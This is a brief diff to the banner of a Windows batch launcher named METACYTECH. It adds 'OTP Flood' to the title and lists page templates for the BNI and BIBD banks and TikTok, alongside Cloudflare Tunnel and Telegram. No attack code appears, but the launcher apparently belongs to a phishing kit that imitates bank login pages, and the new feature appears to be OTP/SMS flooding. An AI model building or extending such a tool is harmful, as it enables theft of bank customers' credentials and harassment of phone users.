@@ -1,6 +1,6 @@
 @echo off
 chcp 65001 >nul 2>&1
-title METACYTECH - Launcher
+title METACYTECH - Launcher + OTP Flood
 cd /d "%~dp0"
 
 echo.
@@ -14,7 +14,8 @@ echo    M   M  EEEE     T   A   A    C      Y       T    EEEE   C   C   H H
 echo.
 echo  ============================================================
 echo.
-echo    Dual Template: BNI + TikTok  *  Cloudflare Tunnel
+echo    Multi Template: BNI + TikTok + BIBD + OTP Flood
+echo    Cloudflare Tunnel  *  Telegram  *  OTP Testing
 echo.
 echo  ============================================================
 echo.
